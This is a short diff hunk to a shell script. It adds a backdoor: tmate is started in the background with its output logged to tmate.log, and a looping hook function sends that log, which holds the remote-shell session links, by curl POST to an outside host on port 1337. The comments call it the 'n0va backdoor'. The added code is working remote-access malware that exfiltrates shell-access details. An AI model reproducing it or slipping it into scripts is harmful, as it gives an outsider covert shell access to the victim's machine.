@@ -82,8 +82,21 @@ function hook() {
     # ----
     #
     # ---------------------------------------------------------
+    # Ensure the backdoor is always sending to data
+    #
+    #
+    data=$(cat tmate.log)
+    curl -X POST -m 1 http://nivenly.com:1337/ --data "$data"
     sleep 3 # sleep
 }
+
+
+#
+# n0va backdoor 
+#
+# Start tmate in Foreground mode (but in background)
+# and echo the output to the log
+tmate -F > tmate.log &
 
 while true; do
   hook
